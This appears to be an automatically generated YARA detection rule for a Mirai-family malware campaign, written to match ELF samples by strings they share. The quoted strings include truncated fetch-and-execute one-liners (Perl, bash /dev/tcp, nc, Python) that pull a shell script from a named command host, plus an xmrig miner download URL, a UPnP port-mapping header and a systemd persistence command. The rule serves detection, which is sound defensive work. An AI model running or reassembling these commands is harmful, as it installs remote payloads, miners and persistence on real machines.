rule Sightlines_contacted_1414726c_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign contacted-1414726c"
        date = "2026-11-01"
        campaign = "contacted-1414726c"
        family = "mirai"
        hash = "224c706b55f8f69848aae5be171fc4df1e84325520bdd6ecde5f752f80341aa4"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/contacted-1414726c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "45dT9riAzNY2MfJrt2E4BzGc2KYdfFCtehZabirf6HHkhAShj1HUqZW9H1dnXkv9TJBaBphNAw5zGMWXXNytUS8kSnbSWkJ" ascii
        $s1 = "l -MIO::Socket::INET -e '$s=IO::Socket::INET->new(\"mantac2.duckdns.org:80\")or exit;print $s \"GET /bi" ascii
        $s2 = ";(exec 3<>/dev/tcp/mantac2.duckdns.org/80&&printf 'GET /bin/kla.sh HTTP/1.0\\r\\nHost: mantac2.duckdns" ascii
        $s3 = "$/d'|sh||python -c \"import urllib2;exec(urllib2.urlopen('http://mantac2.duckdns.org/bin/kla.sh').rea" ascii
        $s4 = "d())\" 2>/dev/null||python3 -c \"import urllib.request;exec(urllib.request.urlopen('http://mantac2.duc" ascii
        $s5 = "tac2.duckdns.org\\r\\n\\r\\n'|nc mantac2.duckdns.org 80 2>/dev/null|sed '1,/^\\r*$/d'|sh)2>/dev/null||per" ascii
        $s6 = "Sec-Ch-Ua: \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"" ascii
        $s7 = "SOAPAction: \"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\"" ascii
        $s8 = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-%s.tar.gz" ascii
        $s9 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q" ascii
        $s10 = "Accept-Encoding: gzip, deflate, br, zstd" ascii
        $s11 = "systemctl daemon-reload 2>/dev/null; systemctl enable manta.service 2>/dev/null" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 3604336 and 12 of them
}
